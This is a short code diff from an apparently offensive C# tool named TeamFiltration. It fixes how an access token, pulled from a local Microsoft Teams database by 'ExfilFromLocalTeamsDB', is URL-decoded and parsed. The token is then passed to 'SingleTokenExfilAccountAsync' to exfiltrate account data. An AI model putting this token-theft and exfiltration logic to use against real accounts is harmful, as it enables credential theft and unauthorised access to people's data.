@@ -218,7 +218,7 @@ namespace TeamFiltration.Modules
                     string token = ExfilFromLocalTeamsDB(filePath);
                     if (!string.IsNullOrEmpty(token))
                     {
-                        await SingleTokenExfilAccountAsync(_globalProperties.OutPutPath, new BearerTokenResp() { access_token = HttpUtility.UrlDecode(token.Split('=')[1].Split('&')[0]) }, exfilOptions, msolHandler);
+                        await SingleTokenExfilAccountAsync(_globalProperties.OutPutPath, new BearerTokenResp() { access_token = HttpUtility.UrlDecode(token).Split('=')[1].Split('&')[0] }, exfilOptions, msolHandler);
                     }
                     else
                     {
